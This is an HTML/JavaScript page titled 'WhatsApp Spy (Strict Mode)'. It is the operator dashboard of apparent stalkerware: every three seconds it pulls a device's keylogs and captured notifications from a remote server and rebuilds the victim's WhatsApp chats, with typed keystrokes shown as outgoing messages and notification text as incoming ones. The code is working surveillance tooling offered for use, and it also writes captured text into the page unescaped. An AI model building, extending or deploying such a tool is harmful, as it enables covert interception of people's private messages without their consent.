<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Spy (Strict Mode)</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* Base Reset */
        body { margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #111b21; color: #e9edef; display: flex; height: 100vh; overflow: hidden; }
        
        /* Sidebar (Contact List) */
        .sidebar { width: 35%; max-width: 400px; background: #202c33; border-right: 1px solid #374045; display: flex; flex-direction: column; z-index: 20; }
        .sidebar-header { padding: 15px; background: #202c33; border-bottom: 1px solid #374045; display: flex; justify-content: space-between; align-items: center; }
        .contact-list { flex: 1; overflow-y: auto; }
        
        .contact { padding: 12px 15px; border-bottom: 1px solid #2a3942; cursor: pointer; display: flex; align-items: center; transition: background 0.2s; }
        .contact:hover, .contact.active { background: #2a3942; }
        
        .avatar { width: 45px; height: 45px; background: #00a884; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-size: 18px; font-weight: bold; flex-shrink: 0; }
        .contact-info { flex: 1; overflow: hidden; }
        .contact-name { font-size: 16px; font-weight: 500; color: #e9edef; margin-bottom: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        
        /* Chat Area */
        .chat-area { flex: 1; background-color: #0b141a; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); display: flex; flex-direction: column; position: relative; width: 100%; }
        
        .chat-header { padding: 10px 15px; background: #202c33; display: flex; align-items: center; border-bottom: 1px solid #374045; height: 60px; z-index: 10; }
        .back-btn { display: none; margin-right: 15px; color: #e9edef; font-size: 20px; cursor: pointer; }
        
        .messages { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 4px; padding-bottom: 30px; }
        
        /* --- BUBBLES (Responsive Fix) --- */
        .msg { 
            max-width: 75%; /* Phone ke liye size fix */
            width: fit-content;
            padding: 6px 10px; 
            border-radius: 8px; 
            font-size: 14.5px; 
            position: relative; 
            word-wrap: break-word; /* Long text todega */
            word-break: break-word;
            line-height: 1.4; 
            margin-bottom: 4px;
            box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); 
        }
        
        /* STRICT COLORS */
        .msg.incoming { 
            background: #202c33; /* Dark Grey */
            align-self: flex-start; /* LEFT SIDE */
            border-top-left-radius: 0; 
            color: #fff;
        }
        
        .msg.outgoing { 
            background: #005c4b; /* Green */
            align-self: flex-end; /* RIGHT SIDE */
            border-top-right-radius: 0; 
            color: #fff;
        }

        .msg-meta { display: flex; justify-content: flex-end; align-items: center; gap: 4px; margin-top: 2px; opacity: 0.7; }
        .time { font-size: 10px; }
        
        /* Status Bar */
        .status-bar { font-size: 11px; text-align: center; padding: 5px; background: #182229; color: #8696a0; }

        /* --- MOBILE VIEW --- */
        @media(max-width: 768px) {
            .sidebar { width: 100%; position: absolute; height: 100%; }
            .chat-area { width: 100%; position: absolute; height: 100%; z-index: 10; }
            .sidebar.hidden { display: none; } /* Hide sidebar when chat is open */
            .back-btn { display: block; }
            .msg { max-width: 85%; font-size: 14px; } /* Thoda aur bada message mobile par */
        }
    </style>
</head>
<body>

    <div class="sidebar" id="sidebar">
        <div class="sidebar-header">
            <span>Chats <span style="font-size:10px; color:#00a884; border:1px solid #00a884; padding:2px 4px; border-radius:4px;">STRICT MODE</span></span>
            <i class="fas fa-sync" id="refreshIcon" onclick="forceSync()" style="cursor:pointer; font-size:14px; margin-right:15px;" title="Force Reload"></i>
            <i class="fas fa-trash-alt" onclick="resetData()" style="cursor:pointer; font-size:14px; color:#f15c6d;" title="Clear All"></i>
        </div>
        <div class="status-bar" id="statusBar">Waiting for data...</div>
        <div class="contact-list" id="contactList">
            </div>
    </div>

    <div class="chat-area">
        <div class="chat-header" id="chatHeader" style="display:none;">
            <i class="fas fa-arrow-left back-btn" onclick="showSidebar()"></i>
            <div class="avatar" id="headerAvatar" style="width:35px; height:35px; font-size:14px; margin-right:10px;"></div>
            <div style="display:flex; flex-direction:column;">
                <span class="chat-title" id="chatTitle">User</span>
                <span style="font-size:11px; color:#8696a0;">WhatsApp</span>
            </div>
        </div>
        
        <div class="messages" id="msgBox">
            <div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100%; color:#8696a0;">
                <i class="fab fa-whatsapp" style="font-size:40px; margin-bottom:10px;"></i>
                <span>Select a chat to view history</span>
            </div>
        </div>
    </div>

    <script>
        // --- CONFIG ---
        const urlParams = new URLSearchParams(window.location.search);
        const deviceId = urlParams.get('id');
        // Nayi ID taki purana kharab data na dikhe
        const STORAGE_KEY = `whatsapp_spy_strict_v9_${deviceId}`; 

        const API_KEYLOGS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/keylogs`;
        const API_NOTIFS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;

        let allChats = {}; 
        let currentChatUser = null;

        // 1. Start
        function loadStorage() {
            const saved = localStorage.getItem(STORAGE_KEY);
            if (saved) {
                try { allChats = JSON.parse(saved); renderContacts(); } 
                catch(e) { console.error("Data corrupted, resetting", e); }
            }
        }

        // 2. Fetch Data (Strict Logic)
        async function syncData() {
            if (!deviceId) {
                document.getElementById('statusBar').innerText = "Error: No Device ID";
                return;
            }
            
            document.getElementById('refreshIcon').classList.add('fa-spin');
            
            try {
                const [logs, notifs] = await Promise.all([
                    fetch(API_KEYLOGS).then(r => r.json()).catch(()=>[]),
                    fetch(API_NOTIFS).then(r => r.json()).catch(()=>[])
                ]);

                let hasNewData = false;

                // --- PROCESS OUTGOING (KEYLOGS) ---
                // Rule: Agar Keylog hai, to wo 100% Outgoing (Right) hai.
                logs.forEach(item => {
                    // Check: Must be Outgoing type OR valid WhatsApp text without package
                    if (item.type === 'outgoing_keylog' || (item.appName === 'WhatsApp' && !item.packageName)) {
                        if(processMessage(item.title || "Unknown", item.text, item.timestamp, 'outgoing')) hasNewData = true;
                    }
                });

                // --- PROCESS INCOMING (NOTIFICATIONS) ---
                // Rule: Notification (com.whatsapp) sirf Incoming (Left) hoti hai.
                // Sort by PostTime to handle stacking order
                notifs.sort((a,b) => a.postTime - b.postTime);
                
                notifs.forEach(item => {
                    if(item.packageName && item.packageName.includes('whatsapp') && item.text) {
                        // Strict Check: Ye Incoming hi hai
                        if(processMessage(item.title, item.text, item.postTime, 'incoming')) hasNewData = true;
                    }
                });

                document.getElementById('statusBar').innerText = `Last updated: ${new Date().toLocaleTimeString()}`;
                
                if (hasNewData) {
                    saveStorage();
                    renderContacts();
                    if(currentChatUser) renderMessages(currentChatUser);
                }

            } catch(e) { 
                console.log(e); 
            } finally {
                document.getElementById('refreshIcon').classList.remove('fa-spin');
            }
        }

        // --- 3. THE BRAIN (Logic Fix) ---
        function processMessage(user, text, time, type) {
            if (!user || !text || text.trim() === "") return false;
            
            // Junk Cleaners
            if (user.includes("WhatsApp") && user.length < 15) return false; // Ignore "WhatsApp" user
            if (text.includes("new messages")) return false; 
            if (text.includes("incoming voice call")) return false;
            if (text.includes("Checking for new messages")) return false;

            let ts = parseInt(time);
            if (!ts || isNaN(new Date(ts).getTime())) return false;

            if (!allChats[user]) allChats[user] = [];
            const history = allChats[user];
            const lastMsg = history[history.length - 1];

            // --- STRICT DEDUPLICATION ---
            
            // Check 1: Exact Duplicate (Same text, same type, within 5 seconds)
            // Fixes: "Confuse ho jata hai"
            const isDuplicate = history.some(m => 
                m.text === text && 
                m.type === type && // Important: Outgoing aur Incoming mix nahi honge
                Math.abs(m.time - ts) < 5000
            );
            if (isDuplicate) return false;

            // --- STACKING FIX (Incoming Only) ---
            if (type === 'incoming' && lastMsg && lastMsg.type === 'incoming') {
                // Scenario: 
                // Msg 1: "Hi"
                // Msg 2: "Hi \n Kaise ho" (Notification Stack)
                
                // Agar naya text purane text se start hota hai
                if (text.startsWith(lastMsg.text)) {
                    const cleanText = text.substring(lastMsg.text.length).trim();
                    if (cleanText.length > 0) {
                        text = cleanText; // Sirf naya hissa lo
                    } else {
                        return false; // Ye duplicate hai
                    }
                }
                
                // Agar naye text mein purana text kahin bhi chipka hai (Regex clean)
                // Remove repeated lines
                const lines = text.split('\n');
                const lastLines = lastMsg.text.split('\n');
                // Agar naya message ka pehla line purane message ka last line hai
                if (lines[0] === lastLines[lastLines.length-1]) {
                     lines.shift(); // Remove duplicate line
                     text = lines.join('\n').trim();
                     if(text === "") return false;
                }
            }

            // --- OUTGOING TYPING FIX ---
            if (type === 'outgoing' && lastMsg && lastMsg.type === 'outgoing') {
                // Typing update: "Hel" -> "Hello"
                if (text.startsWith(lastMsg.text) && Math.abs(ts - lastMsg.time) < 10000) {
                    history.pop(); // Remove "Hel"
                    history.push({ text, time: ts, type }); // Add "Hello"
                    return true;
                }
            }

            // FINAL ADD
            history.push({ text, time: ts, type });
            history.sort((a,b) => a.time - b.time);
            return true;
        }

        function saveStorage() {
            localStorage.setItem(STORAGE_KEY, JSON.stringify(allChats));
        }

        function resetData() {
            if(confirm("Delete all history?")) {
                localStorage.removeItem(STORAGE_KEY);
                location.reload();
            }
        }
        
        function forceSync() {
            syncData();
        }

        // --- RENDER UI ---
        function renderContacts() {
            const list = document.getElementById('contactList');
            const users = Object.keys(allChats).sort((a,b) => {
                const lastA = allChats[a][allChats[a].length-1]?.time || 0;
                const lastB = allChats[b][allChats[b].length-1]?.time || 0;
                return lastB - lastA;
            });

            if(users.length === 0) {
                list.innerHTML = `<div style="padding:20px;text-align:center;color:#666;">Waiting for new messages...<br><small>Background activity depends on phone OS</small></div>`;
                return;
            }

            list.innerHTML = "";
            users.forEach(user => {
                const msgs = allChats[user];
                const last = msgs[msgs.length - 1];
                const active = currentChatUser === user ? 'active' : '';
                const timeStr = new Date(last.time).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
                
                let preview = last.text.substring(0, 30);
                if(last.text.length > 30) preview += "...";
                
                const icon = last.type === 'outgoing' ? '<i class="fas fa-check" style="color:#53bdeb; font-size:10px;"></i> ' : '';

                list.innerHTML += `
                    <div class="contact ${active}" onclick="openChat('${user}')">
                        <div class="avatar">${user[0].toUpperCase()}</div>
                        <div class="contact-info">
                            <div class="contact-name" style="display:flex; justify-content:space-between;">
                                ${user} <span style="font-size:11px; color:#8696a0; font-weight:normal;">${timeStr}</span>
                            </div>
                            <div class="last-msg">${icon}${preview}</div>
                        </div>
                    </div>
                `;
            });
        }

        function openChat(user) {
            currentChatUser = user;
            document.getElementById('chatTitle').innerText = user;
            document.getElementById('headerAvatar').innerText = user[0].toUpperCase();
            
            const header = document.getElementById('chatHeader');
            header.style.display = 'flex';
            
            // Mobile: Hide sidebar
            if(window.innerWidth < 768) {
                document.getElementById('sidebar').classList.add('hidden');
            }
            
            renderMessages(user);
        }

        function showSidebar() {
            document.getElementById('sidebar').classList.remove('hidden');
            currentChatUser = null;
        }

        function renderMessages(user) {
            const box = document.getElementById('msgBox');
            box.innerHTML = "";
            const msgs = allChats[user] || [];
            
            let lastDate = "";

            msgs.forEach(m => {
                const d = new Date(m.time);
                const dStr = d.toLocaleDateString();
                
                // Date Separator
                if (dStr !== lastDate) {
                    box.innerHTML += `<div style="align-self:center; background:#182229; padding:5px 12px; border-radius:8px; font-size:11px; color:#8696a0; margin:15px 0;">${dStr}</div>`;
                    lastDate = dStr;
                }

                const tStr = d.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit', hour12:false});
                
                const div = document.createElement('div');
                div.className = `msg ${m.type}`; // Strict Class Application
                
                // Checkmark for outgoing
                const tick = m.type === 'outgoing' ? '<i class="fas fa-check-double" style="color:#53bdeb; font-size:10px;"></i>' : '';

                div.innerHTML = `
                    ${m.text}
                    <div class="msg-meta">
                        <span class="time">${tStr}</span>
                        ${tick}
                    </div>
                `;
                box.appendChild(div);
            });
            
            // Auto scroll to bottom
            box.scrollTop = box.scrollHeight;
        }

        // Init
        loadStorage();
        syncData();
        
        // Fast polling for responsiveness
        setInterval(syncData, 3000);

    </script>
</body>
</html>
